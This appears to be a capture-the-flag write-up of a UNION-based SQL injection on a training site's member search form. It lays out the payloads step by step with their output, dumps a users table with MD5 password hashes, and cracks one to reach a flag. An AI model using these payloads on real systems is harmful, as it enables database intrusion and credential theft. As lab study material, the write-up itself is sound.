# Breach : SQL in member search

Just like with image search page, we search with an input form entry so we try :

```tsx
1 OR 1=1
```

we get 

```tsx
ID: 1 OR 1=1 
First name: one
Surname : me

ID: 1 OR 1=1 
First name: two
Surname : me

ID: 1 OR 1=1 
First name: three
Surname : me

ID: 1 OR 1=1 
First name: Flag
Surname : GetThe
```

we try to `1 OR 1=1 order by x` until it breaks (at 3) so the size for UNION is 2 cols

now we try to identify our database

```tsx
1 OR 1 = 1 UNION SELECT NULL, database() --  
```

we get that we are in member_sql_injection this time

```
ID: 1 OR 1=1 UNION SELECT null, database()
First name:
Surname : Member_Sql_Injection
```

we can try the last query we did in previous breach on sql injection for users

```tsx
1 OR 1=1 UNION SELECT user_id, country FROM users
```

now it works

```
ID: 1 OR 1=1 UNION SELECT user_id, country FROM users 
First name: 2
Surname : Finlande

ID: 1 OR 1=1 UNION SELECT user_id, country FROM users 
First name: 3
Surname : Irlande
```

so we can remember the past cols value and look for a flag maybe

```tsx
Title: user_id
Title: first_name
Title: last_name
Title: town
Title: country
Title: planet
Title: Commentaire
Title: countersign
Url : users
```

we try 

and get 

```tsx
ID: 1 OR 1=1 UNION SELECT countersign, commentaire FROM users 
First name: three
Surname : me

[...]

ID: 1 OR 1=1 UNION SELECT countersign, commentaire FROM users 
First name: 2b3366bcfd44f540e630d4dc2b9b06d9
Surname : Je pense, donc je suis

ID: 1 OR 1=1 UNION SELECT countersign, commentaire FROM users 
First name: 60e9032c586fb422e2c16dee6286cf10
Surname : Aamu on iltaa viisaampi.

ID: 1 OR 1=1 UNION SELECT countersign, commentaire FROM users 
First name: e083b24a01c483437bcf4a9eea7c1b4d
Surname : Dublin is a city of stories and secrets.

ID: 1 OR 1=1 UNION SELECT countersign, commentaire FROM users 
First name: 5ff9d0165b4f92b14994e5c685cdce28
Surname : Decrypt this password -> then lower all the char. Sh256 on it and it's good !
```

bingo on the flag : we decrypt the pwd with md5 

it yields : `FortyTwo`

we then hash it with sha256:

`9995cae900a927ab1500d317dfcc52c0ad8a521bea878a8e9fa381b41459b646`

# How to avoid this breach ?
see the SQL injection for image Search 